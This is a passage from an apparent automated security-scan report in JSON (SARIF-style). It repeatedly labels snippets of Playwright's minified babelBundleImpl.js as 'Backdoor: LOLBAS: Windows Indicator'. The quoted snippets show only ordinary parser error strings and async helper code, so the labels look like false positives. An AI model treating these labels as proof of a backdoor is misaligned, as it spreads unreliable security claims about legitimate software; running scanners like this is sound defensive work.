                      "text": "ame\";else{let t=$n[$n.length-1];t==null?Er=\"end\":Array.isArray(t)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}}function Wc(){$n.pop();let e=$n[$n.length-1];e==null?Er=\"end\":Array.isArray(e)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScr",
                      "markdown": "`ame\";else{let t=$n[$n.length-1];t==null?Er=\"end\":Array.isArray(t)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}}function Wc(){$n.pop();let e=$n[$n.length-1];e==null?Er=\"end\":Array.isArray(e)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1710,
                  "startColumn": 3,
                  "endLine": 1710,
                  "endColumn": 7,
                  "snippet": {
                    "text": "<s.length;l++){let u=s[l].getFunctionName();if(u===L2)o=\"hiding\";else if(u===M2){if(o===\"hiding\")o=\"showing\",qc.has(n)&&i.unshift(...qc.get(n));else if(o===\"unknown\"){i=s;break}}else o!==\"hiding\"&&i.push(s[l])}return e(n,i)}}function dhe(e,t){return t.length===0?j2(e):`${j2(e)}\n    at ${t.join(`\n    at `)}`}});var di=E(Vc=>{\"use strict\";Object.defineProperty(Vc,\"__esModule\",{value:!0});Vc.default=void 0;var U2=Un(),hg=class extends Error{constructor(t,r){super(t),(0,U2.expectedError)(this),r&&(0,U2.injectVirtualStackFrame)(this,r)}};Vc.default=hg});var V2=E(yg=>{\"use strict\";Object.defineProperty(",
                    "rendered": {
                      "text": "<s.length;l++){let u=s[l].getFunctionName();if(u===L2)o=\"hiding\";else if(u===M2){if(o===\"hiding\")o=\"showing\",qc.has(n)&&i.unshift(...qc.get(n));else if(o===\"unknown\"){i=s;break}}else o!==\"hiding\"&&i.push(s[l])}return e(n,i)}}function dhe(e,t){return t.length===0?j2(e):`${j2(e)}\n    at ${t.join(`\n    at `)}`}});var di=E(Vc=>{\"use strict\";Object.defineProperty(Vc,\"__esModule\",{value:!0});Vc.default=void 0;var U2=Un(),hg=class extends Error{constructor(t,r){super(t),(0,U2.expectedError)(this),r&&(0,U2.injectVirtualStackFrame)(this,r)}};Vc.default=hg});var V2=E(yg=>{\"use strict\";Object.defineProperty(",
                      "markdown": "`<s.length;l++){let u=s[l].getFunctionName();if(u===L2)o=\"hiding\";else if(u===M2){if(o===\"hiding\")o=\"showing\",qc.has(n)&&i.unshift(...qc.get(n));else if(o===\"unknown\"){i=s;break}}else o!==\"hiding\"&&i.push(s[l])}return e(n,i)}}function dhe(e,t){return t.length===0?j2(e):`${j2(e)}\n    at ${t.join(`\n    at `)}`}});var di=E(Vc=>{\"use strict\";Object.defineProperty(Vc,\"__esModule\",{value:!0});Vc.default=void 0;var U2=Un(),hg=class extends Error{constructor(t,r){super(t),(0,U2.expectedError)(this),r&&(0,U2.injectVirtualStackFrame)(this,r)}};Vc.default=hg});var V2=E(yg=>{\"use strict\";Object.defineProperty(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1709,
                  "startColumn": 3,
                  "endLine": 1709,
                  "endColumn": 7,
                  "snippet": {
                    "text": "own\";for(let l=0;l<s.length;l++){let u=s[l].getFunctionName();if(u===L2)o=\"hiding\";else if(u===M2){if(o===\"hiding\")o=\"showing\",qc.has(n)&&i.unshift(...qc.get(n));else if(o===\"unknown\"){i=s;break}}else o!==\"hiding\"&&i.push(s[l])}return e(n,i)}}function dhe(e,t){return t.length===0?j2(e):`${j2(e)}\n    at ${t.join(`\n    at `)}`}});var di=E(Vc=>{\"use strict\";Object.defineProperty(Vc,\"__esModule\",{value:!0});Vc.default=void 0;var U2=Un(),hg=class extends Error{constructor(t,r){super(t),(0,U2.expectedError)(this),r&&(0,U2.injectVirtualStackFrame)(this,r)}};Vc.default=hg});var V2=E(yg=>{\"use strict\";Obje",
                    "rendered": {
                      "text": "own\";for(let l=0;l<s.length;l++){let u=s[l].getFunctionName();if(u===L2)o=\"hiding\";else if(u===M2){if(o===\"hiding\")o=\"showing\",qc.has(n)&&i.unshift(...qc.get(n));else if(o===\"unknown\"){i=s;break}}else o!==\"hiding\"&&i.push(s[l])}return e(n,i)}}function dhe(e,t){return t.length===0?j2(e):`${j2(e)}\n    at ${t.join(`\n    at `)}`}});var di=E(Vc=>{\"use strict\";Object.defineProperty(Vc,\"__esModule\",{value:!0});Vc.default=void 0;var U2=Un(),hg=class extends Error{constructor(t,r){super(t),(0,U2.expectedError)(this),r&&(0,U2.injectVirtualStackFrame)(this,r)}};Vc.default=hg});var V2=E(yg=>{\"use strict\";Obje",
                      "markdown": "`own\";for(let l=0;l<s.length;l++){let u=s[l].getFunctionName();if(u===L2)o=\"hiding\";else if(u===M2){if(o===\"hiding\")o=\"showing\",qc.has(n)&&i.unshift(...qc.get(n));else if(o===\"unknown\"){i=s;break}}else o!==\"hiding\"&&i.push(s[l])}return e(n,i)}}function dhe(e,t){return t.length===0?j2(e):`${j2(e)}\n    at ${t.join(`\n    at `)}`}});var di=E(Vc=>{\"use strict\";Object.defineProperty(Vc,\"__esModule\",{value:!0});Vc.default=void 0;var U2=Un(),hg=class extends Error{constructor(t,r){super(t),(0,U2.expectedError)(this),r&&(0,U2.injectVirtualStackFrame)(this,r)}};Vc.default=hg});var V2=E(yg=>{\"use strict\";Obje`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1708,
                  "startColumn": 2084,
                  "endLine": 1708,
                  "endColumn": 2088,
                  "snippet": {
                    "text": "p(()=>{});n.forEach((a,o)=>{Fc(a,l=>{i[o]=l,s+=1,s===i.length&&t(i)},r)})}}),race:ag({name:\"race\",arity:1,sync:function(e){let t=Array.from(e[0]);if(t.length===0)throw ci(\"Must race at least 1 item\",y2);return og(t[0])},async:function(e,t,r){let n=Array.from(e[0]);if(n.length===0)throw ci(\"Must race at least 1 item\",y2);for(let s of n)Fc(s,t,r)}})});function Ude(e){return{sync:function(...r){return og(e.apply(this,r))},async:function(...r){return new Promise((n,s)=>{Fc(e.apply(this,r),n,s)})},errback:function(...r){let n=r.pop();if(typeof n!=\"function\")throw ci(\"Asynchronous function called withou",
                    "rendered": {
                      "text": "p(()=>{});n.forEach((a,o)=>{Fc(a,l=>{i[o]=l,s+=1,s===i.length&&t(i)},r)})}}),race:ag({name:\"race\",arity:1,sync:function(e){let t=Array.from(e[0]);if(t.length===0)throw ci(\"Must race at least 1 item\",y2);return og(t[0])},async:function(e,t,r){let n=Array.from(e[0]);if(n.length===0)throw ci(\"Must race at least 1 item\",y2);for(let s of n)Fc(s,t,r)}})});function Ude(e){return{sync:function(...r){return og(e.apply(this,r))},async:function(...r){return new Promise((n,s)=>{Fc(e.apply(this,r),n,s)})},errback:function(...r){let n=r.pop();if(typeof n!=\"function\")throw ci(\"Asynchronous function called withou",
                      "markdown": "`p(()=>{});n.forEach((a,o)=>{Fc(a,l=>{i[o]=l,s+=1,s===i.length&&t(i)},r)})}}),race:ag({name:\"race\",arity:1,sync:function(e){let t=Array.from(e[0]);if(t.length===0)throw ci(\"Must race at least 1 item\",y2);return og(t[0])},async:function(e,t,r){let n=Array.from(e[0]);if(n.length===0)throw ci(\"Must race at least 1 item\",y2);for(let s of n)Fc(s,t,r)}})});function Ude(e){return{sync:function(...r){return og(e.apply(this,r))},async:function(...r){return new Promise((n,s)=>{Fc(e.apply(this,r),n,s)})},errback:function(...r){let n=r.pop();if(typeof n!=\"function\")throw ci(\"Asynchronous function called withou`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1708,
                  "startColumn": 1965,
                  "endLine": 1708,
                  "endColumn": 1969,
                  "snippet": {
                    "text": "},async:function(e,t,r){let n=Array.from(e[0]);if(n.length===0){Promise.resolve().then(()=>t([]));return}let s=0,i=n.map(()=>{});n.forEach((a,o)=>{Fc(a,l=>{i[o]=l,s+=1,s===i.length&&t(i)},r)})}}),race:ag({name:\"race\",arity:1,sync:function(e){let t=Array.from(e[0]);if(t.length===0)throw ci(\"Must race at least 1 item\",y2);return og(t[0])},async:function(e,t,r){let n=Array.from(e[0]);if(n.length===0)throw ci(\"Must race at least 1 item\",y2);for(let s of n)Fc(s,t,r)}})});function Ude(e){return{sync:function(...r){return og(e.apply(this,r))},async:function(...r){return new Promise((n,s)=>{Fc(e.apply(thi",
                    "rendered": {
                      "text": "},async:function(e,t,r){let n=Array.from(e[0]);if(n.length===0){Promise.resolve().then(()=>t([]));return}let s=0,i=n.map(()=>{});n.forEach((a,o)=>{Fc(a,l=>{i[o]=l,s+=1,s===i.length&&t(i)},r)})}}),race:ag({name:\"race\",arity:1,sync:function(e){let t=Array.from(e[0]);if(t.length===0)throw ci(\"Must race at least 1 item\",y2);return og(t[0])},async:function(e,t,r){let n=Array.from(e[0]);if(n.length===0)throw ci(\"Must race at least 1 item\",y2);for(let s of n)Fc(s,t,r)}})});function Ude(e){return{sync:function(...r){return og(e.apply(this,r))},async:function(...r){return new Promise((n,s)=>{Fc(e.apply(thi",
                      "markdown": "`},async:function(e,t,r){let n=Array.from(e[0]);if(n.length===0){Promise.resolve().then(()=>t([]));return}let s=0,i=n.map(()=>{});n.forEach((a,o)=>{Fc(a,l=>{i[o]=l,s+=1,s===i.length&&t(i)},r)})}}),race:ag({name:\"race\",arity:1,sync:function(e){let t=Array.from(e[0]);if(t.length===0)throw ci(\"Must race at least 1 item\",y2);return og(t[0])},async:function(e,t,r){let n=Array.from(e[0]);if(n.length===0)throw ci(\"Must race at least 1 item\",y2);for(let s of n)Fc(s,t,r)}})});function Ude(e){return{sync:function(...r){return og(e.apply(this,r))},async:function(...r){return new Promise((n,s)=>{Fc(e.apply(thi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 32844,
                  "endLine": 27,
                  "endColumn": 32848,
                  "snippet": {
                    "text": ".\",TypeBeforeInitializer:\"Type annotations must come before default assignments, e.g. instead of `age = 25: number` use `age: number = 25`.\",TypeCastInPattern:\"The type cast expression is expected to be wrapped with parenthesis.\",UnexpectedExplicitInexactInObject:\"Explicit inexact syntax must appear at the end of an inexact object.\",UnexpectedReservedType:({reservedType:e})=>`Unexpected reserved type ${e}.`,UnexpectedReservedUnderscore:\"`_` is only allowed as a type argument to call or new.\",UnexpectedSpaceBetweenModuloChecks:\"Spaces between `%` and `checks` are not allowed here.\",UnexpectedSpread",
                    "rendered": {
                      "text": ".\",TypeBeforeInitializer:\"Type annotations must come before default assignments, e.g. instead of `age = 25: number` use `age: number = 25`.\",TypeCastInPattern:\"The type cast expression is expected to be wrapped with parenthesis.\",UnexpectedExplicitInexactInObject:\"Explicit inexact syntax must appear at the end of an inexact object.\",UnexpectedReservedType:({reservedType:e})=>`Unexpected reserved type ${e}.`,UnexpectedReservedUnderscore:\"`_` is only allowed as a type argument to call or new.\",UnexpectedSpaceBetweenModuloChecks:\"Spaces between `%` and `checks` are not allowed here.\",UnexpectedSpread",
                      "markdown": "`.\",TypeBeforeInitializer:\"Type annotations must come before default assignments, e.g. instead of `age = 25: number` use `age: number = 25`.\",TypeCastInPattern:\"The type cast expression is expected to be wrapped with parenthesis.\",UnexpectedExplicitInexactInObject:\"Explicit inexact syntax must appear at the end of an inexact object.\",UnexpectedReservedType:({reservedType:e})=>`Unexpected reserved type ${e}.`,UnexpectedReservedUnderscore:\"`_` is only allowed as a type argument to call or new.\",UnexpectedSpaceBetweenModuloChecks:\"Spaces between `%` and `checks` are not allowed here.\",UnexpectedSpread`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 10435,
                  "endLine": 25,
                  "endColumn": 10439,
                  "snippet": {
                    "text": "figuredToken:({token:e})=>`Invalid topic token ${e}. In order to use ${e} as a topic reference, the pipelineOperator plugin must be configured with { \"proposal\": \"hack\", \"topicToken\": \"${e}\" }.`,PipeTopicUnused:\"Hack-style pipe body does not contain a topic reference; Hack-style pipes must use topic at least once.\",PipeUnparenthesizedBody:({type:e})=>`Hack-style pipe body cannot be an unparenthesized ${$u({type:e})}; please wrap it in parentheses.`,PipelineBodyNoArrow:'Unexpected arrow \"=>\" after pipeline body; arrow function in pipeline body must be parenthesized.',PipelineBodySequenceExpression:",
                    "rendered": {
                      "text": "figuredToken:({token:e})=>`Invalid topic token ${e}. In order to use ${e} as a topic reference, the pipelineOperator plugin must be configured with { \"proposal\": \"hack\", \"topicToken\": \"${e}\" }.`,PipeTopicUnused:\"Hack-style pipe body does not contain a topic reference; Hack-style pipes must use topic at least once.\",PipeUnparenthesizedBody:({type:e})=>`Hack-style pipe body cannot be an unparenthesized ${$u({type:e})}; please wrap it in parentheses.`,PipelineBodyNoArrow:'Unexpected arrow \"=>\" after pipeline body; arrow function in pipeline body must be parenthesized.',PipelineBodySequenceExpression:",
                      "markdown": "`figuredToken:({token:e})=>`Invalid topic token ${e}. In order to use ${e} as a topic reference, the pipelineOperator plugin must be configured with { \"proposal\": \"hack\", \"topicToken\": \"${e}\" }.`,PipeTopicUnused:\"Hack-style pipe body does not contain a topic reference; Hack-style pipes must use topic at least once.\",PipeUnparenthesizedBody:({type:e})=>`Hack-style pipe body cannot be an unparenthesized ${$u({type:e})}; please wrap it in parentheses.`,PipelineBodyNoArrow:'Unexpected arrow \"=>\" after pipeline body; arrow function in pipeline body must be parenthesized.',PipelineBodySequenceExpression:`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 9398,
                  "endLine": 25,
                  "endColumn": 9402,
                  "snippet": {
                    "text": "r leading 0.\"},ose={StrictDelete:\"Deleting local variable in strict mode.\",StrictEvalArguments:({referenceName:e})=>`Assigning to '${e}' in strict mode.`,StrictEvalArgumentsBinding:({bindingName:e})=>`Binding '${e}' in strict mode.`,StrictFunction:\"In strict mode code, functions can only be declared at top level or inside a block.\",StrictNumericEscape:\"The only valid numeric escape in strict mode is '\\\\0'.\",StrictOctalLiteral:\"Legacy octal literals are not allowed in strict mode.\",StrictWith:\"'with' in strict mode.\"},lse=new Set([\"ArrowFunctionExpression\",\"AssignmentExpression\",\"ConditionalExpress",
                    "rendered": {
                      "text": "r leading 0.\"},ose={StrictDelete:\"Deleting local variable in strict mode.\",StrictEvalArguments:({referenceName:e})=>`Assigning to '${e}' in strict mode.`,StrictEvalArgumentsBinding:({bindingName:e})=>`Binding '${e}' in strict mode.`,StrictFunction:\"In strict mode code, functions can only be declared at top level or inside a block.\",StrictNumericEscape:\"The only valid numeric escape in strict mode is '\\\\0'.\",StrictOctalLiteral:\"Legacy octal literals are not allowed in strict mode.\",StrictWith:\"'with' in strict mode.\"},lse=new Set([\"ArrowFunctionExpression\",\"AssignmentExpression\",\"ConditionalExpress",
                      "markdown": "`r leading 0.\"},ose={StrictDelete:\"Deleting local variable in strict mode.\",StrictEvalArguments:({referenceName:e})=>`Assigning to '${e}' in strict mode.`,StrictEvalArgumentsBinding:({bindingName:e})=>`Binding '${e}' in strict mode.`,StrictFunction:\"In strict mode code, functions can only be declared at top level or inside a block.\",StrictNumericEscape:\"The only valid numeric escape in strict mode is '\\\\0'.\",StrictOctalLiteral:\"Legacy octal literals are not allowed in strict mode.\",StrictWith:\"'with' in strict mode.\"},lse=new Set([\"ArrowFunctionExpression\",\"AssignmentExpression\",\"ConditionalExpress`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 6777,
                  "endLine": 25,
                  "endColumn": 6781,
                  "snippet": {
                    "text": "gumentPlaceholder:\"Unexpected argument placeholder.\",UnexpectedAwaitAfterPipelineBody:'Unexpected \"await\" after pipeline body; await must have parentheses in minimal proposal.',UnexpectedDigitAfterHash:\"Unexpected digit after hash token.\",UnexpectedImportExport:\"'import' and 'export' may only appear at the top level.\",UnexpectedKeyword:({keyword:e})=>`Unexpected keyword '${e}'.`,UnexpectedLeadingDecorator:\"Leading decorators must be attached to a class declaration.\",UnexpectedLexicalDeclaration:\"Lexical declaration cannot appear in a single-statement context.\",UnexpectedNewTarget:\"`new.target` can",
                    "rendered": {
                      "text": "gumentPlaceholder:\"Unexpected argument placeholder.\",UnexpectedAwaitAfterPipelineBody:'Unexpected \"await\" after pipeline body; await must have parentheses in minimal proposal.',UnexpectedDigitAfterHash:\"Unexpected digit after hash token.\",UnexpectedImportExport:\"'import' and 'export' may only appear at the top level.\",UnexpectedKeyword:({keyword:e})=>`Unexpected keyword '${e}'.`,UnexpectedLeadingDecorator:\"Leading decorators must be attached to a class declaration.\",UnexpectedLexicalDeclaration:\"Lexical declaration cannot appear in a single-statement context.\",UnexpectedNewTarget:\"`new.target` can",
                      "markdown": "`gumentPlaceholder:\"Unexpected argument placeholder.\",UnexpectedAwaitAfterPipelineBody:'Unexpected \"await\" after pipeline body; await must have parentheses in minimal proposal.',UnexpectedDigitAfterHash:\"Unexpected digit after hash token.\",UnexpectedImportExport:\"'import' and 'export' may only appear at the top level.\",UnexpectedKeyword:({keyword:e})=>`Unexpected keyword '${e}'.`,UnexpectedLeadingDecorator:\"Leading decorators must be attached to a class declaration.\",UnexpectedLexicalDeclaration:\"Lexical declaration cannot appear in a single-statement context.\",UnexpectedNewTarget:\"`new.target` can`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 5421,
                  "endLine": 25,
                  "endColumn": 5425,
                  "snippet": {
                    "text": "\"'__proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have static property named prototype.\",SuperNotAllowed:\"`super()` is only valid inside a class constructor of a subclass",
                    "rendered": {
                      "text": "\"'__proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have static property named prototype.\",SuperNotAllowed:\"`super()` is only valid inside a class constructor of a subclass",
                      "markdown": "`\"'__proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have static property named prototype.\",SuperNotAllowed:\"`super()` is only valid inside a class constructor of a subclass`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 5310,
                  "endLine": 25,
                  "endColumn": 5314,
                  "snippet": {
                    "text": " are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.\",RecordNoProto:\"'__proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have stat",
                    "rendered": {
                      "text": " are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.\",RecordNoProto:\"'__proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have stat",
                      "markdown": "` are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.\",RecordNoProto:\"'__proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have stat`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 701,
                  "endLine": 25,
                  "endColumn": 705,
                  "snippet": {
                    "text": "NotDefault:\"A JSON module can only be imported with `default`.\",ImportReflectionHasAssertion:\"`import module x` cannot have assertions.\",ImportReflectionNotBinding:'Only `import module x from \"./module\"` is valid.',IncompatibleRegExpUVFlags:\"The 'u' and 'v' regular expression flags cannot be enabled at the same time.\",InvalidBigIntLiteral:\"Invalid BigIntLiteral.\",InvalidCodePoint:\"Code point out of bounds.\",InvalidCoverInitializedName:\"Invalid shorthand property initializer.\",InvalidDecimal:\"Invalid decimal.\",InvalidDigit:({radix:e})=>`Expected number in radix ${e}.`,InvalidEscapeSequence:\"Bad cha",
                    "rendered": {
                      "text": "NotDefault:\"A JSON module can only be imported with `default`.\",ImportReflectionHasAssertion:\"`import module x` cannot have assertions.\",ImportReflectionNotBinding:'Only `import module x from \"./module\"` is valid.',IncompatibleRegExpUVFlags:\"The 'u' and 'v' regular expression flags cannot be enabled at the same time.\",InvalidBigIntLiteral:\"Invalid BigIntLiteral.\",InvalidCodePoint:\"Code point out of bounds.\",InvalidCoverInitializedName:\"Invalid shorthand property initializer.\",InvalidDecimal:\"Invalid decimal.\",InvalidDigit:({radix:e})=>`Expected number in radix ${e}.`,InvalidEscapeSequence:\"Bad cha",
                      "markdown": "`NotDefault:\"A JSON module can only be imported with `default`.\",ImportReflectionHasAssertion:\"`import module x` cannot have assertions.\",ImportReflectionNotBinding:'Only `import module x from \"./module\"` is valid.',IncompatibleRegExpUVFlags:\"The 'u' and 'v' regular expression flags cannot be enabled at the same time.\",InvalidBigIntLiteral:\"Invalid BigIntLiteral.\",InvalidCodePoint:\"Code point out of bounds.\",InvalidCoverInitializedName:\"Invalid shorthand property initializer.\",InvalidDecimal:\"Invalid decimal.\",InvalidDigit:({radix:e})=>`Expected number in radix ${e}.`,InvalidEscapeSequence:\"Bad cha`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 572,
                  "endLine": 24,
                  "endColumn": 576,
                  "snippet": {
                    "text": " not have an initializer.`,ForInUsing:\"For-in loop may not start with 'using' declaration.\",ForOfAsync:\"The left-hand side of a for-of loop may not be 'async'.\",ForOfLet:\"The left-hand side of a for-of loop may not start with 'let'.\",GeneratorInSingleStatementContext:\"Generators can only be declared at the top level or inside a block.\",IllegalBreakContinue:({type:e})=>`Unsyntactic ${e===\"BreakStatement\"?\"break\":\"continue\"}.`,IllegalLanguageModeDirective:\"Illegal 'use strict' directive in function with non-simple parameter list.\",IllegalReturn:\"'return' outside of function.\",ImportAttributesUseAsse",
                    "rendered": {
                      "text": " not have an initializer.`,ForInUsing:\"For-in loop may not start with 'using' declaration.\",ForOfAsync:\"The left-hand side of a for-of loop may not be 'async'.\",ForOfLet:\"The left-hand side of a for-of loop may not start with 'let'.\",GeneratorInSingleStatementContext:\"Generators can only be declared at the top level or inside a block.\",IllegalBreakContinue:({type:e})=>`Unsyntactic ${e===\"BreakStatement\"?\"break\":\"continue\"}.`,IllegalLanguageModeDirective:\"Illegal 'use strict' directive in function with non-simple parameter list.\",IllegalReturn:\"'return' outside of function.\",ImportAttributesUseAsse",
